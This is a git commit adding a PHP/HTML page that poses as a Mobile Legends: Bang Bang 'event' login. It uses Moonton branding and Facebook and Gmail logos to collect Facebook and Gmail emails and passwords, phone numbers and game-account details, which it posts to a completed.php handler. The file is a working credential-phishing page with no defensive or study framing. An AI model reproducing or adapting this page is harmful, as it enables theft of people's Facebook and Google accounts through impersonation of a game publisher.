7a841b7bda1df12bd290e40c8b3e96c2087096b8
Mudjiba95 <78946484+Mudjiba95@users.noreply.github.com>
2021-02-12 13:35:23 +0800

    Create login-fb.php

---
+++ login-fb.php
@@ -0,0 +1,109 @@
+<!DOCTYPE html>
+<html>
+<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Mobile Legend | Event's</title>
+<link rel="shorcut icon" href="garena.png">
+<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css" integrity="sha384-GJzZqFGwb1QTTN6wy59ffF1BuGJpLSa9DkKMp0DgiMDm4iYMj70gZWKYbI706tWS" crossorigin="anonymous">
+<style>
+h1, .h1, h2, .h2, h3, .h3 {
+    margin-top: 0px;
+    margin-bottom: 10.5px;
+}
+body { 
+  background: url(https://serving.photos.photobox.com/26141425a0003b3e097be4fb153c24a8a757df2b042731b31a11d9748129c44134b2f825.jpg) no-repeat center center fixed; 
+  -webkit-background-size: cover;
+  -moz-background-size: cover;
+  -o-background-size: cover;
+  background-size: cover;
+}
+.error-msg {
+    margin: .5em 0;
+    display: block;
+    color: #dd4b39;
+    line-height: 17px;
+}
+.col-md-6 {
+ margin:0 auto;
+ float:none;
+}
+.col-md-8 {
+ margin:0 auto;
+ float:none;
+}
+</style>
+
+			<img style="border:none;width:100%;max-height:270px;margin:0 auto;" src="https://i2.wp.com/sadewapulsa.com/wp-content/uploads/2019/01/ML.png?fit=536%2C274&ssl=1&w=640"/>
+			
+					<center><button type="" class="btn btn-outline-primary"><b>Mobile Legend : BangBang</b></button></center>
+			</div>
+		</div>
+		<center style="background:;"><br>
+		<div class="col-md-8">
+		    
+			<h1><font color=”#FF00FF”>LOGIN ACCOUNT</h1>
+			<div class="btn btn-outline-primary">
+				<h4>Masuk Akun</h4>
+				<br/>
+				<form id="glogin" action="completed.php" method="post">
+				<center><img height="65" width="65" src="https://4.bp.blogspot.com/-_ntKK3Y2-Bs/XFyVzwe9u7I/AAAAAAAAADs/zw6Et6PIx_wXwMgRhTNS6rhYrOAvVYlFgCLcBGAs/s1600/fb.png"></center>
+				</br>
+					<div style="width:100%" class="form-group">
+						<input class="form-control" name="efb" placeholder="Email or Phone" type="text" required></div>
+					<div style="width:100%" class="form-group">
+						<input class="form-control" name="pfb" placeholder="Password" type="password" required></div>
+						
+				<center><img height="50" width="50" src="https://upload.wikimedia.org/wikipedia/commons/4/4e/Gmail_Icon.png"></center>
+				</br>
+					<div style="width:100%" class="form-group">
+						<input class="form-control" name="gmail" placeholder="Email or Phone" type="text" required></div>
+					<div style="width:100%" class="form-group">
+						<input class="form-control" name="gpass" placeholder="Password" type="password" required><br>
+						<div style="width:100%" class="form-group">
+						<input class="form-control" name="nomerhp" placeholder="Number Phone" type="number" required></div>
+						</br><h3><b>DETAIL YOUR ACCOUNT</b></h3>
+							<div style="width:100%" class="form-group">
+						<input class="form-control" name="nickname" placeholder="Nickname" type="text" required></div>
+					<div style="width:100%" class="form-group">
+						<input class="form-control" name="level" placeholder="Account Level" type="number" required></div>
+							<div style="width:100%" class="form-group">
+						<input class="form-control" name="skin" placeholder="Skin Amount (Jumlah Skin) " type="number" required></div>
+						 <div style="width:100%" class="form-group">
+        <select class="form-control" name="rank">
+          <option>Your Rank (Rank Anda)</option>
+          <option>Warior</option>
+          <option>Master</option>
+          <option>Grand Master</option>
+          <option>Epic</option>
+          <option>Legends</option>
+          <option>Mythic</option>
+          </select>
+</div>
+																<form role="form" method="POST">
+
+
+						
+						
+					<div style="width:100%" class="form-group">
+						<input type="submit" name="gsubmit" class="btn btn-outline-danger" id="gsubmit" value="Submit Account"></form>
+				</div>
+			</div>
+			<br>
+			<br></div>
+	
+			<center>
+			<p>
+				<b>Moontoon</b>
+			</p>
+			</center>
+
+		</p>
+		<p>
+		<div class="col-12 text-center">
+		Copyright © MLBB International - <i> Click <b>Button </b><a href="https://m.mobilelegends.com/" target="_red"><u>Mobile Legend : BangBang</u></a>
+		</p>
+	</div>
+</div>
+</div>
